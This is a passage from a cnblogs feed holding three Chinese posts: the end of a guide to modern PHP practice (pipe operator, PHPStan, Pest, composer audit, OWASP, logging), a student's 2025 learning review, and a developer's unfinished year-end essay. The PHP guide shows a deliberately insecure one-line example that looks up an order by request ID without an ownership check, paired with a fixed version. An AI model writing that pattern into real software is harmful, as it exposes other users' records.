) {}\n\n    public Money $paid {\n        set (Money $value) {\n            if ($value-&gt;currency !== $this-&gt;total-&gt;currency) {\n                throw new InvalidArgumentException('Currency mismatch');\n            }\n            if ($value-&gt;cents &gt; $this-&gt;total-&gt;cents) {\n                throw new InvalidArgumentException('Overpayment not allowed');\n            }\n            $this-&gt;paid = $value;\n        }\n    }\n}\n</code></pre>\n<p><strong>注意：</strong> 别用钩子隐藏 IO 或副作用。钩子用于验证和转换；IO 保持显式。</p>\n<p><strong>为什么这个习惯有用：</strong></p>\n<p>领域规则更难绕过，重构时更容易推理。</p>\n<h2 id=\"习惯-4用管道操作符让转换可读\">习惯 4：用管道操作符让转换可读</h2>\n<p>PHP 8.5 包含管道操作符，最适合可预测的命名转换。</p>\n<p>在请求规范化、映射和数据塑形中会立即感受到——这些地方 PHP 代码经常变成嵌套调用或\"临时变量汤\"。</p>\n<pre><code class=\"language-php\">&lt;?php\ndeclare(strict_types=1);\n\nfunction trimAll(array $xs): array {\n    return array_map('trim', $xs);\n}\n\nfunction dropEmpty(array $xs): array {\n    return array_values(array_filter($xs, fn($x) =&gt; $x !== ''));\n}\n\nfunction lower(array $xs): array {\n    return array_map(fn($x) =&gt; strtolower($x), $xs);\n}\n\nfunction unique(array $xs): array {\n    return array_values(array_unique($xs));\n}\n\n$tags = ['  PHP ', '', 'Backend', 'php', 'backend '];\n\n$normalized = $tags\n    |&gt; trimAll(...)\n    |&gt; dropEmpty(...)\n    |&gt; lower(...)\n    |&gt; unique(...);\n\nprint_r($normalized);\n</code></pre>\n<p><strong>经验法则：</strong> 每个步骤能用 2-4 个词总结，管道就有帮助。步骤需要一段话，就别内联。</p>\n<p><strong>为什么这个习惯有用：</strong></p>\n<p>意图更清晰，减少审查时间和重构风险。</p>\n<h2 id=\"习惯-5把静态分析加入日常反馈循环\">习惯 5：把静态分析加入日常反馈循环</h2>\n<p>静态分析是 PHP 中最可靠的\"技能倍增器\"之一。原因很简单：PHP 灵活，灵活性就是 bug 藏身之处。</p>\n<p>PHPStan 2.0 是重要里程碑（2024 年发布，2025 年广泛采用）。</p>\n<p>不用静态分析，就是选择在运行时发现本可以在编译时发现的问题。</p>\n<h3 id=\"不会引起反抗的采用策略\">不会引起反抗的采用策略</h3>\n<p>从能实现的级别开始，然后收紧。</p>\n<p>示例 <code>phpstan.neon</code>：</p>\n<pre><code class=\"language-neon\">parameters:\n  level: 6\n  paths:\n    - src\n  reportUnmatchedIgnoredErrors: true\n</code></pre>\n<p>在 CI 中：</p>\n<pre><code class=\"language-bash\">vendor/bin/phpstan analyse --memory-limit=1G\n</code></pre>\n<p>然后迭代：</p>\n<ul>\n<li><strong>级别 6</strong>：清理明显问题</li>\n<li><strong>级别 7-8</strong>：强制更好的类型和 null 处理</li>\n<li><strong>级别 9-10</strong>：仅在代码库准备好后</li>\n</ul>\n<h3 id=\"最重要的实践给数组加类型\">最重要的实践：给数组加类型</h3>\n<p>未类型化的数组会让分析失效。尽可能用 DTO，数组不可避免时就注释：</p>\n<pre><code class=\"language-php\">&lt;?php\n/**\n * @return array&lt;int, array{sku: string, qty: int}&gt;\n */\nfunction parseItems(array $payload): array\n{\n    $items = [];\n    foreach (($payload['items'] ?? []) as $row) {\n        $items[] = [\n            'sku' =&gt; (string)($row['sku'] ?? ''),\n            'qty' =&gt; (int)($row['qty'] ?? 0),\n        ];\n    }\n    return $items;\n}\n</code></pre>\n<p><strong>为什么这个习惯有用：</strong></p>\n<p>学会表达正确性约束，工具成为始终在线的审查者。</p>\n<h2 id=\"习惯-6写保护业务规则的测试别只追求覆盖率\">习惯 6：写保护业务规则的测试，别只追求覆盖率</h2>\n<p>2026 年，测试工具继续与现代 PHP 对齐：</p>\n<ul>\n<li>PHPUnit 11 需要 PHP 8.2+</li>\n<li>Pest 4 目标 PHP 8.3+</li>\n</ul>\n<p>这不是琐事，是信号：要用现代测试工具，运行时得跟上。</p>\n<h3 id=\"测什么高-roi-目标\">测什么（高 ROI 目标）</h3>\n<p>时间有限就测那些关乎金钱或信任的规则：</p>\n<ul>\n<li>折扣和舍入</li>\n<li>幂等性（重复支付请求）</li>\n<li>权限检查（谁能看到什么）</li>\n<li>取消/退款窗口</li>\n<li>库存预留</li>\n</ul>\n<p>一个能捕获真实 bug 的小例子：舍入行为。</p>\n<pre><code class=\"language-php\">&lt;?php\ndeclare(strict_types=1);\n\nfinal class Discount\n{\n    public function apply(int $priceCents, int $percent): int\n    {\n        if ($percent &lt; 0 || $percent &gt; 100) {\n            throw new InvalidArgumentException('percent must be 0..100');\n        }\n        $cut = (int) round($priceCents * ($percent / 100));\n        return max(0, $priceCents - $cut);\n    }\n}\n</code></pre>\n<p>Pest 风格测试（紧凑但可读）：</p>\n<pre><code class=\"language-php\">&lt;?php\ndeclare(strict_types=1);\n\nit('applies discount with correct rounding', function () {\n    $d = new Discount();\n    expect($d-&gt;apply(999, 10))-&gt;toBe(899); // 99.9 rounds to 100\n    expect($d-&gt;apply(1000, 10))-&gt;toBe(900);\n});\n\nit('rejects invalid percent', function () {\n    $d = new Discount();\n    expect(fn() =&gt; $d-&gt;apply(1000, -1))-&gt;toThrow(InvalidArgumentException::class);\n    expect(fn() =&gt; $d-&gt;apply(1000, 101))-&gt;toThrow(InvalidArgumentException::class);\n});\n</code></pre>\n<h3 id=\"习惯中的习惯把计算和-io-分开\">习惯中的习惯：把计算和 IO 分开</h3>\n<p>业务逻辑和数据库调用、HTTP 调用混在一起，测试就变得困难且缓慢——所以人们不写了。</p>\n<p>进阶做法是为计算写纯函数/服务，把 IO 放在接口后面。这不是\"企业架构\"，是可测试性。</p>\n<p><strong>为什么这个习惯有用：</strong></p>\n<p>学会为正确性和可维护性设计，而不只是\"让端点工作\"。</p>\n<h2 id=\"习惯-7把依赖卫生变成不可协商的构建步骤\">习惯 7：把依赖卫生变成不可协商的构建步骤</h2>\n<p>Composer 的 <code>audit</code> 命令是最简单的胜利之一。Composer 文档说得很清楚，audit 会根据公告检查已安装的包（默认用 Packagist），用退出代码检测废弃的包，可以在 CI 中用。</p>\n<h3 id=\"在-ci-中添加别指望有人会运行\">在 CI 中添加（别指望\"有人会运行\"）</h3>\n<pre><code class=\"language-bash\">composer install --no-interaction --no-progress --prefer-dist\ncomposer audit --format=summary\n</code></pre>\n<h3 id=\"用-composer-脚本变成开发者习惯\">用 Composer 脚本变成开发者习惯</h3>\n<pre><code class=\"language-json\">{\n  \"scripts\": {\n    \"check\": [\n      \"composer validate --no-interaction\",\n      \"composer audit --format=summary\",\n      \"vendor/bin/phpstan analyse --memory-limit=1G\",\n      \"vendor/bin/phpunit\"\n    ]\n  }\n}\n</code></pre>\n<p>现在开发者运行：</p>\n<pre><code class=\"language-bash\">composer check\n</code></pre>\n<p>一个命令，一致的结果。</p>\n<p><strong>为什么这个习惯有用：</strong></p>\n<p>把供应链风险当作工程质量的一部分，而不是\"稍后安全部门的事\"。</p>\n<h2 id=\"习惯-8把-owasp-当思维模型别当合规清单\">习惯 8：把 OWASP 当思维模型，别当合规清单</h2>\n<p>OWASP Top 10 是面向开发者的意识基线。OWASP 指出，最新版本是 OWASP Top 10:2026。</p>\n<p>访问控制失效仍是主要风险（2021 年是 A01，2026 年还是 A01）。</p>\n<p><strong>换句话说：</strong> 授权错误仍是出事故最快的方式之一。</p>\n<h3 id=\"每周习惯找一类访问控制-bug-并消除\">每周习惯：找一类访问控制 bug 并消除</h3>\n<p>常见模式：按 ID 取记录，不限定到已认证用户/租户。</p>\n<p><strong>糟糕的模式：</strong></p>\n<pre><code class=\"language-php\">$order = $repo-&gt;findById((int)$_GET['orderId']);\n</code></pre>\n<p><strong>更好：</strong></p>\n<pre><code class=\"language-php\">$userId = $auth-&gt;userId();\n$orderId = (int)$_GET['orderId'];\n$order = $repo-&gt;findForUser($orderId, $userId);\nif ($order === null) {\n    http_response_code(404);\n    exit;\n}\n</code></pre>\n<h3 id=\"另一个高影响习惯到处用预处理语句\">另一个高影响习惯：到处用预处理语句</h3>\n<pre><code class=\"language-php\">$stmt = $pdo-&gt;prepare('SELECT * FROM users WHERE email = :email');\n$stmt-&gt;execute(['email' =&gt; $email]);\n$user = $stmt-&gt;fetch();\n</code></pre>\n<p>不用记住每个 OWASP 类别，把它当覆盖地图用：</p>\n<ul>\n<li>访问控制</li>\n<li>输入处理</li>\n<li>配置错误</li>\n<li>供应链故障</li>\n</ul>\n<p><strong>为什么这个习惯有用：</strong></p>\n<p>把安全本能直接构建到实现决策里。</p>\n<h2 id=\"习惯-9把可观测性当代码特性别只当基础设施\">习惯 9：把可观测性当代码特性，别只当基础设施</h2>\n<p>大多数工程师只在出问题后才关心日志，这是倒着来的。</p>\n<p>进阶习惯是给重要代码路径加仪表：</p>\n<ul>\n<li>认证事件</li>\n<li>支付状态转换</li>\n<li>外部 API 调用</li>\n<li>重试和回退</li>\n<li>\"不可能\"的分支</li>\n</ul>\n<h3 id=\"最小的结构化日志模式psr-3-风格\">最小的结构化日志模式（PSR-3 风格）</h3>\n<pre><code class=\"language-php\">&lt;?php\n$logger-&gt;info('payment.authorize.started', [\n    'order_id' =&gt; $orderId,\n    'provider' =&gt; 'stripe',\n    'idempotency_key' =&gt; $key,\n]);\n\ntry {\n    $res = $gateway-&gt;authorize($command);\n    $logger-&gt;info('payment.authorize.ok', [\n        'order_id' =&gt; $orderId,\n        'provider_ref' =&gt; $res-&gt;reference,\n    ]);\n} catch (Throwable $e) {\n    $logger-&gt;error('payment.authorize.failed', [\n        'order_id' =&gt; $orderId,\n        'error' =&gt; $e-&gt;getMessage(),\n        'exception' =&gt; $e::class,\n    ]);\n    throw $e;\n}\n</code></pre>\n<h3 id=\"事故时有回报的习惯关联-id\">事故时有回报的习惯：关联 ID</h3>\n<ul>\n<li>传入请求有关联 ID 头就重用</li>\n<li>没有就生成一个</li>\n<li>放在该请求的每个日志行里</li>\n</ul>\n<p>把\"我们有日志\"变成\"我们能追踪单个用户操作\"。</p>\n<p><strong>为什么这个习惯有用：</strong></p>\n<p>减少平均理解时间（MTTU），不只是平均恢复时间。</p>\n<h2 id=\"习惯-10性能工作从测量开始别猜\">习惯 10：性能工作从测量开始，别猜</h2>\n<p>PHP 中性能问题通常来自：</p>\n<ul>\n<li>N+1 数据库查询</li>\n<li>大量序列化/反序列化</li>\n<li>对大数据集的无界循环</li>\n<li>昂贵代码路径中缺少缓存</li>\n</ul>\n<p>高影响习惯是每周选一个端点做\"性能阅读\"：</p>\n<ul>\n<li>它运行多少查询？</li>\n<li>响应有多大？</li>\n<li>p95 延迟是多少？</li>\n<li>在并发下会发生什么？</li>\n</ul>\n<h3 id=\"实用的微优化习惯消除可避免的分配\">实用的微优化习惯：消除可避免的分配</h3>\n<p>处理大数据时，生成器能减少内存压力：</p>\n<pre><code class=\"language-php\">&lt;?php\ndeclare(strict_types=1);\n\n/**\n * @return Generator&lt;int, array{sku: string, qty: int}&gt;\n */\nfunction streamItems(iterable $rows): Generator\n{\n    foreach ($rows as $row) {\n        yield [\n            'sku' =&gt; (string)$row['sku'],\n            'qty' =&gt; (int)$row['qty'],\n        ];\n    }\n}\n</code></pre>\n<p>别混淆微优化和真正的胜利。真正的胜利通常是查询塑形和缓存。</p>\n<p><strong>为什么这个习惯有用：</strong></p>\n<p>学会把代码决策和生产行为（延迟、吞吐量、成本）联系起来。</p>\n<h2 id=\"习惯-11建立复利的个人工程循环\">习惯 11：建立复利的个人工程循环</h2>\n<p>强大的开发者不靠情绪，靠循环：</p>\n<ol>\n<li>改点小东西</li>\n<li>快速拿到反馈</li>\n<li>重复</li>\n</ol>\n<p>2026 年对 PHP 效果好的循环：</p>\n<ul>\n<li><strong>编码前：</strong> 定义输入/输出形状（DTO、枚举、值对象）</li>\n<li><strong>编码时：</strong> 保持函数小，清晰命名转换（管道有帮助）</li>\n<li><strong>推送前：</strong> 运行 <code>composer check</code>（audit + 静态分析 + 测试）</li>\n<li><strong>审查中：</strong> 找不变量、边界、访问控制和\"安静的复杂性\"</li>\n<li><strong>发布后：</strong> 在风险更改的地方加日志/指标</li>\n</ul>\n<p>这不是仪式，是发布经得起时间考验的代码的方式。</p>\n<h2 id=\"30-天提升-php-水平的计划\">30 天提升 PHP 水平的计划</h2>\n<p>想要能实际执行的，这样做：</p>\n<h3 id=\"第-1-周现代工具基线\">第 1 周：现代工具基线</h3>\n<ul>\n<li>CI 中加 <code>composer audit</code></li>\n<li>加 PHPStan 在适度级别并让它通过</li>\n<li>加 <code>composer check</code> 脚本用于本地运行</li>\n</ul>\n<h3 id=\"第-2-周数据边界和不变量\">第 2 周：数据边界和不变量</h3>\n<ul>\n<li>给 2-3 个关键端点引入 DTO 边界</li>\n<li>在一个模块里用枚举替换字符串状态字段</li>\n<li>在构造函数或属性钩子里加不变量</li>\n</ul>\n<h3 id=\"第-3-周重要的测试\">第 3 周：重要的测试</h3>\n<ul>\n<li>给金钱/舍入/折扣或其他\"业务核心\"加测试</li>\n<li>运行时允许的话，转向现代测试基线（PHPUnit 11 / Pest）</li>\n</ul>\n<h3 id=\"第-4-周安全和生产反馈\">第 4 周：安全和生产反馈</h3>\n<ul>\n<li>给顶级敏感资源审计访问控制（OWASP A01 思维）</li>\n<li>给风险流程加关联 ID + 结构化日志</li>\n<li>选一个端点减少查询数量或有效负载大小</li>\n</ul>\n<p>月底会注意到复利效应：更少回归，更快审查，更清晰重构。</p>\n<h2 id=\"结论\">结论</h2>\n<p>现代 PHP（8.4 和 8.5）提供了减少样板、提高表达力的工具——属性钩子、非对称可见性、管道操作符等。</p>\n<p>但这些工具只有在习惯创建的系统中才重要：</p>\n<ul>\n<li>输入尽早变成类型化数据</li>\n<li>不变量靠近状态</li>\n<li>分析和测试持续运行</li>\n<li>依赖自动审计</li>\n<li>安全思维是实现的一部分</li>\n<li>生产反馈在日志和指标里可见</li>\n</ul>\n<p>真实团队里的\"进阶\"就是这样：不是英雄式重构，而是无聊的习惯，复利到代码库变得更容易改变而不是破坏。</p>\n\n</div>\n<div class=\"clear\"></div>\n\n            </div>\n            <div class=\"postDesc\">posted @ \n<span id=\"post-date\">2026-01-01 07:48</span>&nbsp;\n<a href=\"https://www.cnblogs.com/catchadmin\">JaguarJack</a>&nbsp;\n阅读(<span id=\"post_view_count\">13</span>)&nbsp;\n评论(<span id=\"post_comment_count\">0</span>)&nbsp;\n&nbsp;\n<a href=\"\">收藏</a>&nbsp;\n<a href=\"\">举报</a>\n</div>"
    },
    {
      "title": "2025年度总结",
      "link": "https://www.cnblogs.com/SilverGo/p/19428614",
      "published": "",
      "description": "<h1 class=\"postTitle\">\n                <a class=\"postTitle2 vertical-middle\" href=\"https://www.cnblogs.com/SilverGo/p/19428614\" id=\"cb_post_title_url\" title=\"发布于 2025-12-31 22:47\">\n    <span>2025年度总结</span>\n    \n\n</a>\n\n            </h1>\n            <div class=\"clear\"></div>\n            <div class=\"postBody\">\n                <div class=\"blogpost-body cnblogs-markdown\" id=\"cnblogs_post_body\">\n<h1 id=\"table-of-contents\">Table of Contents</h1>\n<ol>\n<li><a href=\"#org936be25\" rel=\"noopener nofollow\">2025年度总结</a></li>\n<li><a href=\"#org07aceb4\" rel=\"noopener nofollow\">关于Ctorch</a></li>\n<li><a href=\"#orgc1859ea\" rel=\"noopener nofollow\">关于CSP-J</a></li>\n<li><a href=\"#org1d85aae\" rel=\"noopener nofollow\">关于lambda演算、UTM（通用图灵机）、Coq</a></li>\n<li><a href=\"#org9a42a9e\" rel=\"noopener nofollow\">关于汇编</a></li>\n<li><a href=\"#orgabafce1\" rel=\"noopener nofollow\">一些感想</a></li>\n<li><a href=\"#org89cb23b\" rel=\"noopener nofollow\">资料</a></li>\n<li><a href=\"#org3319ea0\" rel=\"noopener nofollow\">结语</a></li>\n</ol>\n<p>Powered by GhostFace's Emacs.</p>\n<p><a id=\"org936be25\"></a></p>\n<h1 id=\"2025年度总结\">2025年度总结</h1>\n<p><a id=\"org07aceb4\"></a></p>\n<h2 id=\"关于ctorch\">关于Ctorch</h2>\n<p><strong>Ctorch 诞生的第166天。</strong><br />\n没想到，ct都这么大了，<strong>从一个单人项目到现在4人的小团队，从一个模糊的想法到如今近万行的代码，总计5个月13天。</strong></p>\n<p>不得不说，这段时间，学到了很多。</p>\n<p><strong>从来没有用过git的人，commit了近160次；<br />\n从来没有接触过汇编的人，为了极限优化、搞懂编译器行为，学了2个月的汇编；<br />\n曾经连类都没写过的人，写了5个几千行的类；<br />\n曾经连朴素矩阵乘都不会写的菜鸡，手搓了一个Strassen+分块的并行矩阵乘</strong>；<br />\n诸如此类，不再列举。</p>\n<p><a id=\"orgc1859ea\"></a></p>\n<h2 id=\"关于csp-j\">关于CSP-J</h2>\n<p>本蒟蒻已经很长时间没有更新过日志了，可能的原因是比较忙。</p>\n<p><strong>最近几个月，本人一直在忙CSP-J的准备、Ctorch的开发、Coq的学习与lambda演算上。<br />\n先在暑假发起了「挑战3个月达省一」的挑战（当然，挑战成功了）</strong>；</p>\n<p>这一段时间，刷的题比我之前一年刷的都多；</p>\n<p>20多天，我学习了：<strong>dp、图论、并查集、加权并查集、模拟退火等算法，之前一年也只学了排序；</strong></p>\n<p><strong>怎么说呢，之前一直没搞清楚的搜索算法，现在看来也不过如此。</strong></p>\n<p><a id=\"org1d85aae\"></a></p>\n<h2 id=\"关于lambda演算utm通用图灵机coq\">关于lambda演算、UTM（通用图灵机）、Coq</h2>\n<p>随后，先是因为知道了C++有个叫lambda表达式的东西，随后在洛谷上搜索，<strong>意外看到了一篇讲lambda演算的文章</strong>；</p>\n<p>抱着在学校上课无聊的心态，学习了lambda演算，结果一发不可收拾。</p>\n<p>学完之后，我得知<strong>lambda演算图灵完备，于是乎，我想起了一个好玩的东西：用无类型lambda演算手搓UTM（通用图灵机），这当然理论可行</strong>。</p>\n<p>反正我平时能够思考的时间很多，在问过AI后，得知这是一次非常困难但是收获极大的挑战，我便开始了我的构建。</p>\n<p><strong>一支笔，一个本，一个脑子，不看论文，不搜索，只思考。<br />\n每天上放学的路上，走着需要35min左右，这段时间，我就会不停地思考关于UTM的问题。<br />\n这个过程很爽，因为我在构建一个完整的世界，理论上，这台「仅仅依靠代入完成计算」的“计算机”可以完成任何工作，只要你想，甚至可以跑一个仿真的Windows.</strong></p>\n<p>写了快几十张纸，我才明白，AI说的那句：<strong>「lambda演算可以练习思维」</strong>，突然有一天，我看待调用、递归的感觉完全变了，我看函数的感觉也变了。</p>\n<p><strong>我们都觉得，是先有了数字，才有了函数;</strong><br />\n但是，Church数字告诉我们，<strong>数字也是函数</strong>。</p>\n<p>（这个名为LUTM的UTM仍在设计，不过，由于Ctorch对我的优先级更高，目前暂时停工，等2月16日发布Ctorch RC 1之后再继续）</p>\n<p><strong>学习完lambda演算后，我接触到了Coq。<br />\nCoq证明「加法左零律」的思路让我感觉无比震惊，这完全颠覆了我对数学归纳法的认知</strong>。</p>\n<p><strong>而且，Coq中对自然数的定义和lambda演算的列表出奇的一致。<br />\n怎么说呢，可能这就是「万变不离其宗」吧.</strong><br />\n但是仍然是为了Ctorch的开发，我暂停了Coq的学习。</p>\n<p><a id=\"org9a42a9e\"></a></p>\n<h2 id=\"关于汇编\">关于汇编</h2>\n<p>在这之后，我学习了Arm64汇编。<br />\n仅仅是写出一个Hello World，我就花了2天（当然，我在学校每天只有10min能用电脑，20min可以和AI对话）.<br />\n但仅此一次，我就明白了，C++中递归、调用是如何做的，本质其实就是将x29,x30寄存器的值修改；<br />\n我也明白了，什么是「栈溢出」，什么是「调用栈」。<br />\n几行的C++换成汇编就可能需要数十行，这让我写代码时会思考着汇编的样子。<br />\n不得不说，这确实是一次很好的历练。</p>\n<p><a id=\"orgabafce1\"></a></p>\n<h2 id=\"一些感想\">一些感想</h2>\n<p>回首这几个月我所经历的，可能比我之前一年学的都要多，都要杂；</p>\n<p><strong>这些知识无疑带给了我很强的塑造作用：<br />\n设计LUTM，锻炼了我进行2小时以上的深度思考的能力；<br />\n学习汇编，让我对底层有了掌控；<br />\n学习lambda演算，让我对函数有了更彻底的认识；<br />\n可以说，对一个初中生而言，这条路径独一无二。<br />\n我结识了一群志同道合的朋友，有了自己的团队、组织；<br />\n曾经那个被嘲笑“写这些有什么用”、“连个奖都拿不到”的人，如今竟成为一个开源项目的开发者、CSP-J的省一。</strong><br />\n<strong>毫无疑问，这是无比有价值的半年；</strong></p>\n<p><a id=\"org89cb23b\"></a></p>\n<h1 id=\"资料\">资料</h1>\n<p>下面放一点资料</p>\n<p>1.设计LUTM时与Deepseek的对话：<a href=\"https://chat.deepseek.com/share/wednovjlp5sa013j4q\" rel=\"noopener nofollow\" target=\"_blank\">https://chat.deepseek.com/share/wednovjlp5sa013j4q</a><br />\n2.文章：《恭喜自己，挑战成功》————CSP-J省一获奖感言：<a href=\"https://www.cnblogs.com/SilverGo/p/19223328\" target=\"_blank\">https://www.cnblogs.com/SilverGo/p/19223328</a><br />\n3.文章：《逆袭导论·初中生的宝书》：<a href=\"https://www.cnblogs.com/SilverGo/p/19284999\" target=\"_blank\">https://www.cnblogs.com/SilverGo/p/19284999</a><br />\n4.文章：《矩阵乘法优化》：<a href=\"https://www.cnblogs.com/SilverGo/p/19019364\" target=\"_blank\">https://www.cnblogs.com/SilverGo/p/19019364</a><br />\n5.Ctorch的github：<a href=\"https://github.com/ShengFlow/CTorch/tree/feature-nn.Module?tab=contributing-ov-file\" rel=\"noopener nofollow\" target=\"_blank\">https://github.com/ShengFlow/CTorch/tree/feature-nn.Module?tab=contributing-ov-file</a><br />\n6.以下是图片：<br />\n<img alt=\"截屏2025-12-28 10.22.19\" height=\"982\" src=\"https://img2024.cnblogs.com/blog/3357339/202512/3357339-20251231224442471-111964913.png\" width=\"1512\" /><br />\n<img alt=\"截屏2025-12-18 06.31.21\" height=\"982\" src=\"https://img2024.cnblogs.com/blog/3357339/202512/3357339-20251231224520016-1653169643.png\" width=\"1512\" /><br />\n<img alt=\"截屏2025-10-04 16.25.21\" height=\"982\" src=\"https://img2024.cnblogs.com/blog/3357339/202512/3357339-20251231224619686-610660255.png\" width=\"1512\" /></p>\n<p><a id=\"org3319ea0\"></a></p>\n<h1 id=\"结语\">结语</h1>\n<blockquote>\n<p>“Put yourself in places that are gonna cause you to stretch<br />\n让自己置身于能促使自己突破的境地<br /><br />\nA fighter isn't someone that never fails<br />\n真正的勇士并非永不失败<br /><br />\nA fighter is someone who never quits<br />\n而是永不言弃<br /><br />\nYou are more to me than you could never now<br />\n你对我而言远比自己想象的更重要<br /><br />\nAnd I know I've got a full room of fighters in here right<br />\n此刻我深知这满座皆是勇者”<br /></p>\n</blockquote>\n<blockquote>\n<p>“I see ,I like ,I go ,I get.<br />\n目之所及，心之所向，踏上征程，志在必得！”<br /></p>\n</blockquote>\n<blockquote>\n<p>“为天地立心，<br /><br />\n为生民立命，<br /><br />\n为往圣继绝学，<br /><br />\n为万世开太平”————宋·张载《横渠四句》<br /></p>\n</blockquote>\n<blockquote>\n<p>“身处低谷不自弃，我命由我不由天。<br /><br />\n无人扶我青云志，我自踏雪至山巅。<br /><br />\n若是命中无此运，亦可孤身登昆仑。<br /><br />\n红尘赠我三尺剑，酒换瘦马一世街。<br /><br />\n世人朝路乃绝涧，独见众生止步前。<br /><br />\n海到尽头天作岸，山登绝顶我为峰。<br /><br />\n如若东山能再起，大鹏展翅九万里。<br /><br />\n一入红尘梦易真，一朝悟透心境名。<br /><br />\n一朝悟道见真我，昔日枷锁皆云烟。<br /><br />\n天门将至百运开，拂尘轻笑问仙来。<br /><br />\n何须扶我青云志，我自凌云至山巅！”————徐霞客《青云志》<br /></p>\n</blockquote>\n<p><strong>2025，对我而言，注定是难忘的一年.</strong><br />\n<strong>诸位，新年快乐！</strong></p>\n<p><strong>预告：我们预计在2026.2.16（除夕）发布Ctorch RC v1.0，敬请期待，欢迎联系：QQ 1113109729，参与内测，感激不尽！</strong></p>\n<p>GhostFace<br />\n2025.12.31</p>\n\n</div>\n<div class=\"clear\"></div>\n\n            </div>\n            <div class=\"postDesc\">posted @ \n<span id=\"post-date\">2025-12-31 22:47</span>&nbsp;\n<a href=\"https://www.cnblogs.com/SilverGo\">Ghost-Face</a>&nbsp;\n阅读(<span id=\"post_view_count\">22</span>)&nbsp;\n评论(<span id=\"post_comment_count\">0</span>)&nbsp;\n&nbsp;\n<a href=\"\">收藏</a>&nbsp;\n<a href=\"\">举报</a>\n</div>"
    },
    {
      "title": "2025 年终总结｜30岁",
      "link": "https://www.cnblogs.com/liyq666/p/19427476",
      "published": "",
      "description": "<h1 class=\"postTitle\">\n                <a class=\"postTitle2 vertical-middle\" href=\"https://www.cnblogs.com/liyq666/p/19427476\" id=\"cb_post_title_url\" title=\"发布于 2025-12-31 16:47\">\n    <span>2025 年终总结｜30岁</span>\n    \n\n</a>\n\n            </h1>\n            <div class=\"clear\"></div>\n            <div class=\"postBody\">\n                    <div id=\"cnblogs_post_description\" style=\"display: none;\">\n        \n        今天是2025最后一天，回顾这一年，感到的只有对未来的迷茫，我是一名前端开发，在AI的冲击以及大环境的影响下，离开了上一家公司，Gap到现在，写下这篇年终总结，算是对自己的2025年有个交代吧\n    </div>\n<div class=\"blogpost-body cnblogs-markdown\" id=\"cnblogs_post_body\">\n<h1 id=\"前言\">前言</h1>\n<p>今天是2025最后一天，回顾这一年，感到的只有对未来的迷茫，我是一名前端开发，在25年之前可以说是一名很纯粹的前端，在AI的冲击以及大环境的影响下，离开了上一家公司，然后就是Gap到现在，坐在上海出租屋的电脑前，写下这篇年终总结，算是对自己的2025年有个交代吧。</p>\n<h2 id=\"回顾来时路\">回顾来时路</h2>\n<p>我出生于河南的一个农村家庭，大学学的计算机，18年毕业入行前端，在郑州拿到了第一份工作3.5K，待了大概10个月，算是起点吧，在这里接触并学习了React，很感激第一家公司，确实为我之后的工作打下了基础；</p>\n<p>第二份工作6k好像，待了8个月，然后倒闭了，无奈换到了郑州的第三家公司，在这个公司待了1年2个月，薪资是9k不到，正准备一展宏图，然后公司又倒闭了，还拖欠了差不多4个月💰，欠了我3w多的薪资，至今未拿到手。随着钱包逐渐干瘪，我知道不能在公司继续耗下去，于是拿了离职证明破釜沉舟直接来了大都市上海打拼。</p>\n<p>在郑州待了差不多三年，主要技术栈是React + Vue，做的都是C端的一些产品，做过App，wx小程序，wx公众号，web网页等，申请过软著，上架过应用商店，上架过小程序，对接过商城的支付，一路摸着石头过河，好在走过来了。</p>\n<p>20年来了上海，入职了上一家公司，薪资是14K，有奖金包，这边企业主要是做B端的产品，基本相当于从0开始了。</p>\n<p>入职后，感叹大城市的繁华，我在10号线航中路附近租了一个“蛋壳公寓🏠”房子，说是押一付一，实际是微众银行的贷款，然后20年“蛋壳”暴雷😂，当时的我面临🏠住不了，押金💰退不了，还要背上一年贷款，经历过那段的人应该知道，当时网络上各种，有的🔥房子，有的跳楼，有的拿🔪威胁不搬走。直到那时候我才发现，刚到上海就踩了一个“坑”，多亏了各路英雄的的群策群力，以及网络舆论的影响，还有政府的居中协调，最终我的结果就是贷款不用还了，但押金，只能吃哑巴亏咽了。</p>\n<p>从20年入职直到25年初，共4年7个多月，之前郑州三年我基本是不与客户直接打交道的，来到上海这边，做B端企业产品，就得跟客户打交道，在这期间，真的很感谢🙏我的领导，从最初的青涩到逐渐自然，我确实成长了很多，下面举一些面对客户的例子：</p>\n<ol>\n<li>首先态度要有，（面对反馈要及时响应）实际做是后面的事；</li>\n<li>需求变更问题，（不要怕争吵）态度也是要有，不要啥都接受；</li>\n</ol>\n<p>多的就不再多言。这份工作主要是企业定制化开发，修修补补是常态，也有从0-1的项目，算是进一步沉淀了技术吧。时间来到24年，有一个项目需要出差，出差山东，刚开始说是3个月，没想到一直出差了一整年，直到离职，项目也还没结束。</p>\n<h2 id=\"被裁\">被裁</h2>\n<p>3月份，还在山东出差加班的我，收到了公司HR的消息，沟通组织架构调整事宜，我只能选择接受，于是3月底，离开出差一年的潍坊，回到了上海，拿了离职证明，离开了我工作近5年的公司，由于之前一年都是做的修修补补，对于吃饭的技能感觉有点生疏，于是我选择沉淀一段时间，正好也休息一下长期加班疲惫的身体。</p>\n<h2 id=\"找工作\">找工作</h2>\n<p>4-5月眨眼过去，从6月份，我开始逐渐的整简历，投简历，邀面试，这时才发现，市场好像变化了，不再问大量的“八股文”，而是转而问场景题，从项目整体思维出发面试。</p>\n<p>记得当时有一位面试官问我，工作7年，你最拿得出手的项目是什么，有从0-1搭建过项目吗？我挑了最近几年的项目中一个做了回答，因为还是B端的企业内部系统，技术上没有C端那些更亮眼的技术，也没有所谓的高并发什么的，最后当然挂了。</p>\n<p>之前都是用Umi，Dva、react-create-app、Vue-cli、Antd、Element Ui等现成的脚手架及库搭建项目，B端项目讲究敏捷开发，重业务，轻页面，说句不好听的就是“能用就行、好用就行”，于是结束面试后我开始萌生一个想法，从0-1去搭建一个项目。</p>\n<p>6月份Boss上沟通了几百个，投了几十简历，面试了几个，比例几乎是10:1:1，结果很扎心，于是我一边投简历，一边写代码，不能让自己闲下来，不然容易乱想，就这样靠着这份信念，我从0-1搭建了一个项目，完善了搭建的历程<br />\n<a href=\"https://juejin.cn/post/7519864446069489704\" rel=\"noopener nofollow\" target=\"_blank\"># 从零搭建 react 模板 【React 18 + Webpack 5 + Antd 5 + React-Router 6 】</a>，</p>\n<p>7-8月份我拿着这份从0-1搭建的项目去面试，比之6月份好像好了点，但又好的有限，期间又完善了权限控制<br />\n<a href=\"https://juejin.cn/post/7525733315133341706\" rel=\"noopener nofollow\" target=\"_blank\"># React 18 全局错误捕获 + React-router 6 